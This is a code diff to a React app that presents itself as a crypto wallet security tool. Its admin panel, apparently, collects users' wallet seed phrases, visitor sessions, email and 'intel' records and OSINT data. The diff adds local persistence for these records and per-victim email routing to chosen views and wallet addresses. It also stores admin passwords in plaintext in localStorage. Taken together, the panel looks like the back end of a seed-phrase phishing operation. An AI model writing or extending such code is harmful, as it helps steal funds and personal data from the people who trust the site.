@@ -113,11 +113,18 @@ type ProtectChecklistItem = { id: string; text: string; level: Severity }
 type CryptoNewsItem = { id: string; title: string; summary: string; source: string; url: string; imageUrl: string | null; publishedAt: number }
 type VisitorStatus = 'allowed' | 'restricted'
 
+type ExplorerType = 'etherscan' | 'xrpscan' | 'blockchair' | 'bscscan' | 'polygonscan' | 'arbiscan' | 'basescan' | 'solscan' | 'custom'
+
 type UserEmailRoute = {
   id: string
   email: string
   view: ViewKey
   label: string
+  // explorer config
+  address?: string
+  explorerType?: ExplorerType
+  explorerNetwork?: string
+  explorerCustomUrl?: string
 }
 
 type ConnectedWalletRecord = {
@@ -274,6 +281,17 @@ const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
 const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
 const SEED_PHRASES_KEY     = 'sv_seed_phrases_v1'
 const NEW_USER_KEY         = 'sv_new_user_v1'
+const CONNECTED_WALLETS_KEY  = 'sv_connected_wallets_v1'
+const SCAN_HISTORY_KEY       = 'sv_scan_history_v1'
+const SIGNER_CHECKS_KEY      = 'sv_signer_checks_v1'
+const EMAIL_RECORDS_KEY      = 'sv_email_records_v1'
+const ADMIN_INTEL_KEY        = 'sv_admin_intel_v1'
+const BOT_REQUESTS_KEY       = 'sv_bot_requests_v1'
+const USER_ROUTES_KEY        = 'sv_user_routes_v1'
+const NEWSLETTER_KEY         = 'sv_newsletter_v1'
+const ADMIN_CREDS_KEY        = 'sv_admin_creds_v1'
+const SUPPORT_CONFIG_KEY     = 'sv_support_config_v1'
+const PROTECT_CHECKLIST_KEY  = 'sv_protect_checklist_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
 const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
 const ETHERSCAN_LOCKOUT_MS = 15 * 60 * 1000
@@ -809,11 +827,25 @@ export default function App() {
   const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
   const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes' | 'bots'>('wallets')
-  const [adminCreds,           setAdminCreds]           = useState<AdminCreds>({ email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD })
-  const [supportConfig,        setSupportConfig]        = useState<SupportConfig>({ email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM })
+  const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
+    try {
+      const stored = JSON.parse(localStorage.getItem(ADMIN_CREDS_KEY) ?? 'null') as AdminCreds | null
+      if (stored?.email && stored?.password) return stored
+    } catch { /* ignore */ }
+    return { email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD }
+  })
+  const [supportConfig, setSupportConfig] = useState<SupportConfig>(() => {
+    try {
+      const stored = JSON.parse(localStorage.getItem(SUPPORT_CONFIG_KEY) ?? 'null') as SupportConfig | null
+      if (stored?.email !== undefined) return stored
+    } catch { /* ignore */ }
+    return { email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM }
+  })
   const [supportEmailInput,    setSupportEmailInput]    = useState('')
   const [supportStatus,        setSupportStatus]        = useState('')
-  const [newsletterEmails,     setNewsletterEmails]     = useState<string[]>([])
+  const [newsletterEmails, setNewsletterEmails] = useState<string[]>(() => {
+    try { return JSON.parse(localStorage.getItem(NEWSLETTER_KEY) ?? '[]') as string[] } catch { return [] }
+  })
   const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>(() => {
     try { return JSON.parse(localStorage.getItem(VISITOR_SESSIONS_KEY) ?? '[]') as VisitorSessionRecord[] }
     catch { return [] }
@@ -846,12 +878,22 @@ export default function App() {
   const [visitorActionMsg,     setVisitorActionMsg]     = useState('')
   const [settingsError,        setSettingsError]        = useState('')
 
-  // Records
-  const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>([])
-  const [scanHistory,      setScanHistory]      = useState<ScanRecord[]>([])
-  const [signerChecks,     setSignerChecks]     = useState<SignerCheckRecord[]>([])
-  const [emailRecords,     setEmailRecords]     = useState<EmailRecord[]>([])
-  const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>([])
+  // Records — localStorage-backed for offline resilience, cloud synced on top
+  const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]') as ConnectedWalletRecord[] } catch { return [] }
+  })
+  const [scanHistory, setScanHistory] = useState<ScanRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(SCAN_HISTORY_KEY) ?? '[]') as ScanRecord[] } catch { return [] }
+  })
+  const [signerChecks, setSignerChecks] = useState<SignerCheckRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(SIGNER_CHECKS_KEY) ?? '[]') as SignerCheckRecord[] } catch { return [] }
+  })
+  const [emailRecords, setEmailRecords] = useState<EmailRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(EMAIL_RECORDS_KEY) ?? '[]') as EmailRecord[] } catch { return [] }
+  })
+  const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(ADMIN_INTEL_KEY) ?? '[]') as AdminIntelRecord[] } catch { return [] }
+  })
   const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(() => {
     try { return JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[] }
     catch { return [] }
@@ -859,7 +901,9 @@ export default function App() {
   const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
 
   // Bot Deploy
-  const [botRequests,       setBotRequests]       = useState<BotDeployRequest[]>([])
+  const [botRequests, setBotRequests] = useState<BotDeployRequest[]>(() => {
+    try { return JSON.parse(localStorage.getItem(BOT_REQUESTS_KEY) ?? '[]') as BotDeployRequest[] } catch { return [] }
+  })
   const [botModalOpen,      setBotModalOpen]      = useState(false)
   const [botModalStep,      setBotModalStep]      = useState<'info' | 'form' | 'processing' | 'pending'>('info')
   const [botFormEmail,      setBotFormEmail]      = useState('')
@@ -876,7 +920,9 @@ export default function App() {
   const [seedFormNotes,     setSeedFormNotes]     = useState('')
   const [seedFormError,     setSeedFormError]     = useState('')
   const [seedFormMsg,       setSeedFormMsg]       = useState('')
-  const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>([])
+  const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>(() => {
+    try { return JSON.parse(localStorage.getItem(PROTECT_CHECKLIST_KEY) ?? '[]') as string[] } catch { return [] }
+  })
   const [cryptoNews, setCryptoNews] = useState<CryptoNewsItem[]>(STATIC_NEWS)
   const [newsLoading, setNewsLoading] = useState(false)
   const [newsLive, setNewsLive] = useState(false)
@@ -922,12 +968,18 @@ export default function App() {
   const [emailGateInput,    setEmailGateInput]    = useState('')
   const [gateEmail,         setGateEmail]         = useState(() => localStorage.getItem(GATE_EMAIL_KEY) ?? '')
   const [emailGateError,    setEmailGateError]    = useState('')
-  const [userEmailRoutes,   setUserEmailRoutes]   = useState<UserEmailRoute[]>([])
-  const [routeFormEmail,    setRouteFormEmail]    = useState('')
-  const [routeFormView,     setRouteFormView]     = useState<ViewKey>('home')
-  const [routeFormLabel,    setRouteFormLabel]    = useState('')
-  const [routeFormError,    setRouteFormError]    = useState('')
-  const [routeFormMsg,      setRouteFormMsg]      = useState('')
+  const [userEmailRoutes, setUserEmailRoutes] = useState<UserEmailRoute[]>(() => {
+    try { return JSON.parse(localStorage.getItem(USER_ROUTES_KEY) ?? '[]') as UserEmailRoute[] } catch { return [] }
+  })
+  const [routeFormEmail,         setRouteFormEmail]         = useState('')
+  const [routeFormView,          setRouteFormView]          = useState<ViewKey>('home')
+  const [routeFormLabel,         setRouteFormLabel]         = useState('')
+  const [routeFormError,         setRouteFormError]         = useState('')
+  const [routeFormMsg,           setRouteFormMsg]           = useState('')
+  const [routeFormAddress,       setRouteFormAddress]       = useState('')
+  const [routeFormExplorer,      setRouteFormExplorer]      = useState<ExplorerType>('etherscan')
+  const [routeFormExplorerNet,   setRouteFormExplorerNet]   = useState('')
+  const [routeFormCustomUrl,     setRouteFormCustomUrl]     = useState('')
 
   const openWalletModal = async () => {
     try {
@@ -1128,21 +1180,25 @@ export default function App() {
 
 
   useEffect(() => {
+    try { localStorage.setItem(CONNECTED_WALLETS_KEY, JSON.stringify(connectedWallets)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ connected_wallets: connectedWallets })
   }, [connectedWallets])
 
   useEffect(() => {
+    try { localStorage.setItem(SIGNER_CHECKS_KEY, JSON.stringify(signerChecks)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ signer_checks: signerChecks })
   }, [signerChecks])
 
   useEffect(() => {
+    try { localStorage.setItem(EMAIL_RECORDS_KEY, JSON.stringify(emailRecords)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ email_records: emailRecords })
   }, [emailRecords])
 
   useEffect(() => {
+    try { localStorage.setItem(ADMIN_INTEL_KEY, JSON.stringify(adminIntelRecords)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ admin_intel_records: adminIntelRecords })
   }, [adminIntelRecords])
@@ -1153,39 +1209,45 @@ export default function App() {
     saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
 
-
   useEffect(() => {
+    try { localStorage.setItem(SCAN_HISTORY_KEY, JSON.stringify(scanHistory)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ scan_history: scanHistory })
   }, [scanHistory])
 
   useEffect(() => {
+    try { localStorage.setItem(PROTECT_CHECKLIST_KEY, JSON.stringify(protectChecklistDone)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ protect_checklist_done: protectChecklistDone })
   }, [protectChecklistDone])
 
   useEffect(() => {
+    try { localStorage.setItem(SUPPORT_CONFIG_KEY, JSON.stringify(supportConfig)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ support_config: supportConfig })
   }, [supportConfig])
 
   useEffect(() => {
+    try { localStorage.setItem(NEWSLETTER_KEY, JSON.stringify(newsletterEmails)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ newsletter_emails: newsletterEmails })
   }, [newsletterEmails])
 
   useEffect(() => {
+    // Persist full credentials locally (this is local-only data, never sent in plaintext to cloud)
+    try { localStorage.setItem(ADMIN_CREDS_KEY, JSON.stringify(adminCreds)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
-    // Store only the email — never persist the plaintext password to the cloud.
     saveToCloud({ admin_creds: { email: adminCreds.email, password: '' } as AdminCreds })
   }, [adminCreds])
 
   useEffect(() => {
+    try { localStorage.setItem(USER_ROUTES_KEY, JSON.stringify(userEmailRoutes)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
 
   useEffect(() => {
+    try { localStorage.setItem(BOT_REQUESTS_KEY, JSON.stringify(botRequests)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ bot_requests: botRequests })
   }, [botRequests])
@@ -1205,7 +1267,11 @@ export default function App() {
 
   // ── Cloud load on mount ───────────────────────────────────────────────────
   useEffect(() => {
-    loadFromCloud().then(row => {
+    loadFromCloud().catch(() => {
+      // Cloud unavailable — allow local edits to sync once cloud is reachable
+      cloudLoadedRef.current = true
+    }).then(row => {
+      if (!row) return
       if (row.connected_wallets)      setConnectedWallets(row.connected_wallets      as ConnectedWalletRecord[])
       if (row.scan_history)           setScanHistory(row.scan_history                as ScanRecord[])
       if (row.signer_checks)          setSignerChecks(row.signer_checks              as SignerCheckRecord[])
@@ -2419,10 +2485,22 @@ export default function App() {
       email,
       view: routeFormView,
       label: routeFormLabel.trim() || email,
+      ...(routeFormAddress.trim() && {
+        address: routeFormAddress.trim(),
+        explorerType: routeFormExplorer,
+        explorerNetwork: routeFormExplorerNet.trim() || undefined,
+        explorerCustomUrl: routeFormExplorer === 'custom' ? routeFormCustomUrl.trim() : undefined,
+      }),
     }
     setUserEmailRoutes(prev => [route, ...prev])
-    setRouteFormEmail(''); setRouteFormView('home'); setRouteFormLabel('')
-    setRouteFormMsg(`Route added: ${email} → ${routeFormView}`)
+    setRouteFormEmail('')
+    setRouteFormView('home')
+    setRouteFormLabel('')
+    setRouteFormAddress('')
+    setRouteFormExplorer('etherscan')
+    setRouteFormExplorerNet('')
+    setRouteFormCustomUrl('')
+    setRouteFormMsg(`Route added: ${email} → ${routeFormView}${route.address ? ` (${route.explorerType}: ${route.address.slice(0,10)}…)` : ''}`)
   }
 
   const removeUserRoute = (id: string) => {
